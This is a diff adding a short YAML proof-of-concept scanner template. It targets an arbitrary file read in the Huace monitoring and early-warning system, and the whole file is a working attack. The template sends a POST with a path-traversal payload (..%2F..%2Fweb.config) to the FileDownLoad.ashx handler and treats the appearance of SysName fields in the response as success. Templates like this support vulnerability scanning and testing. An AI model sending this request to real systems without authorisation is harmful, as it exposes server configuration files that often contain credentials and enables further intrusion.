@@ -1,0 +1,16 @@
+name: poc-yaml-华测监测预警系统-Directory 
+description: >-
+  任意文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /Handler/FileDownLoad.ashx
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "filename=1&filepath=..%2F..%2Fweb.config"
+    expression:
+      status: 200
+      body_all:
+        - "SysName"
+        - "SysNameEn"
